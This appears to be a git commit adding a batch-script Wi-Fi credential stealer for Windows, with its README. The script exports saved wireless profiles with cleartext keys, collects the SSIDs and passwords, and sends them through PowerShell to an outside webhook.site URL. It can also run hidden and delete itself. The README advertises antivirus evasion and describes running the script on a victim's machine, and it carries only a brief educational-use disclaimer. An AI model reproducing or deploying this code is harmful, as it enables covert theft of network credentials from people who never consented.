2ffbbde9d41993547cfc455c2e1c0b5b52135598
Psi505 <Psi505@protonmail.com>
2023-12-23 00:34:58 +0100

    first commit

---
+++ README.md
@@ -0,0 +1,68 @@
+## About
+This is a simple batch program to grab Wi-Fi credentials from a local Windows machine.
+
+
+## Features
+- It does not need to be compiled.
+- Runs on any windows machine (7/8.1/10/11).
+- Undetectable by the default Windows Security AV (didn't test other AVs, but it should be also undetectable by them).
+- Exfiltrated cedentials can be sent to a [webhook](https://webhook.site/) or saved locally to a txt file.
+- The program has the ability to self-delete.
+- To avoid problems caused by specials characters, the credentials are also stored in a hexadecimal value (in the form `name:password`).
+
+**Note**: When using [Webhook.site](https://webhook.site/), please take the expiration of the URLs into consideration.
+
+
+## Usage
+There is a wide variety of ways to run the program. You can choose to use it in whatever way suits your needs. But usually, you either run this program on your machine or on a target machine. Here are some examples on how you can use the program:
+
+### Running the program on a local machine (yours)
+To run the script and save the credentials in the default `txt` file (this code line sets the default text file: `set "credsfile=creds.txt"`.), simply type:
+
+```batch
+> WiFi-Stealer.bat
+```
+
+Or you can specify a name for the `txt` file (or any file type), type this:
+
+```batch
+> WiFi-Stealer.bat --output "wifi-credentials.txt"
+```
+
+### Running the program on the target machine
+Usually when running the program of a remote machine (program downloaded and executed by the victim) or a machine that you gained phisical access to, you need a way to retrieve the credentials. This is how you do it:
+
+- Specify the webhook as an argument
+Simply run the program and pass the URL of your webhook as an argument:
+
+```batch
+> WiFi-Stealer.bat --upload "https://webhook.site/#!/87258b74-93c5-4792-8175-df08c3ffee20"
+```
+
+- Store the webhook inside the program
+If you can't run the program from the command prompt or to avoid typing the url, ensure to save your webhook's URL in the variable `webhook` within the program. Another important step is to change the value of the `upload` variable from `0` to `1`. Once the program is executed, you will receive the credentials.
+
+```batch
+set upload=0
+
+set "webhook=https://webhook.site/#!/87258b74-93c5-4792-8175-df08c3ffee20"
+```
+
+- Another cool feature is to make the program delete itself when it's done. To do this, you can simply change `selfdelete` varibale inside the program from `0` to `1`.
+
+- To run the program in stealth (hidden) mode, remove the `::` form this line in the program:
+
+```batch
+::@powershell -window Hidden -command ""   &:: Uncomment if you want to run the program in hidden mode
+```
+
+
+## Screenshots
+
+![](https://raw.githubusercontent.com/Psi505/WiFi-Stealer/main/Screenshot_1.png)
+
+![](https://raw.githubusercontent.com/Psi505/WiFi-Stealer/main/Screenshot_2.png)
+
+
+## ⚠️ DISCLAIMER
+This project can only be used for educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.
---
+++ WiFi-Stealer.bat
@@ -0,0 +1,113 @@
+::@mode 15,1
+::@powershell -window Hidden -command ""   &:: Uncomment if you want to run the program in hidden mode
+@Echo off
+:: Change the current encoding to print special characters
+powershell -c "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8"
+
+:: Default values. Change them to whatever you want!
+set selfdelete=0
+set upload=0
+set "credsfile=creds.txt"
+set "webhook="
+::
+
+:: Arguments
+if "%~1"=="--upload" if "%~2" neq "" (
+	set "webhook=%~2"
+	set upload=1
+)
+
+if "%~1"=="--output" if "%~2" neq "" (
+	set "credsfile=%~2"
+	set upload=0
+)
+
+:: Prepare environment for xml files
+del %credsfile% 2>nul
+rmdir /s /q "%temp%\profiles" 2>nul
+mkdir "%temp%\profiles" 2>nul
+pushd "%temp%\profiles"
+
+:: Prepare the str2hex.vbs file
+call :init
+netsh wlan export profile key=clear >nul
+
+:Repeat
+	:: Get the name of last enumerated xml file
+	set "file="
+	for /f "delims=:" %%i in ('dir /b *.xml 2^>nul') do (set file=%%i)
+	if "%file%"=="" (goto endRepeat)
+	:: Convert file value to hex, then rename the file with that name (to avoid special chars causing the program to crash)
+	set "_file=%file%"
+	for /f %%a in ('cscript //nologo str2hex.vbs "%file%"') do (set "file=%%a")
+	rename "%_file%" %file% 2>&1 >nul
+
+	:: Get name
+	set "name="
+	for /f "tokens=*" %%j in ('findstr /c:"<name>" "%file%"') do (set name=%%j && goto :exitforname)
+	:exitforname
+	set "name=%name:<name>=%"
+	set "name=%name:</name>=%"
+	:: Avoid program crash with names that contain "&" character
+	set "name=%name:&=^&%"
+
+	:: Convert name to hex
+	set "name_hex="
+	for /f "tokens=*" %%j in ('findstr /c:"<hex>" "%file%"') do (set name_hex=%%j)
+	set "name_hex=%name_hex:<hex>=%"
+	set "name_hex=%name_hex:</hex>=%"
+
+	:: Get password
+	set "key="
+	for /f "tokens=*" %%j in ('findstr /c:"<keyMaterial>" "%file%"') do (set key=%%j)
+	if "%key%"=="" (set "key=none")
+	set "key=%key:<keyMaterial>=%"
+	set "key=%key:</keyMaterial>=%"
+	:: Avoid program crash with passwords that contain "&" character
+	set "key=%key:&=^&%"
+
+	:: Convert key to hex
+	for /f %%a in ('cscript //nologo str2hex.vbs "%key%"') do (set "key_hex=%%a")
+	
+	del "%file%" 2>nul
+
+	echo.
+	echo [!] SSID: %name%
+	echo [+] Password: %key%
+
+	:: Fix a weird echo problem
+	setlocal EnableDelayedExpansion
+	echo [^^!] SSID: !name!>>%credsfile%
+	endlocal
+	echo [+] Password: %key%>> %credsfile%
+	echo [!] Hex pair: %name_hex%3a%key_hex%>> %credsfile%
+	:: Hex pairs are added as a precaution in case the SSIDs/Passwords contain special chars and to preserve the original values
+	echo.>> %credsfile%
+goto Repeat
+:endRepeat
+
+:: Cleanup
+popd
+:: Send credsfile to webhook
+if %upload%==1 (
+	powershell -c "Invoke-RestMethod -Uri '%webhook%' -Method POST -Body (Get-Content -Raw -Path '%temp%\profiles\%credsfile%') -ContentType 'text/plain'" >nul
+	del %credsfile% 2>nul
+)
+:: The program will delete itself if enabled
+if %selfdelete%==1 (del "%~f0" 2>nul)
+move "%temp%\profiles\%credsfile%" "%cd%" 2>&1 >nul
+rmdir /s /q "%temp%\profiles" 2>nul
+exit /b
+
+
+:init
+	:: Prepare str2hex.vbs script to be used for string conversion to hex
+	:: Note: It's faster to use a vbs script to convert to hex than a powershell command ;)
+	(echo inputString = WScript.Arguments^(0^)
+	 echo hexString = ""
+	 echo For i = 1 To Len^(inputString^)
+	 echo     hexValue = Hex^(Asc^(Mid^(inputString, i, 1^)^)^)
+	 echo     hexString = hexString ^& hexValue
+	 echo Next
+	 echo WScript.Echo hexString)>str2hex.vbs
+Exit /b
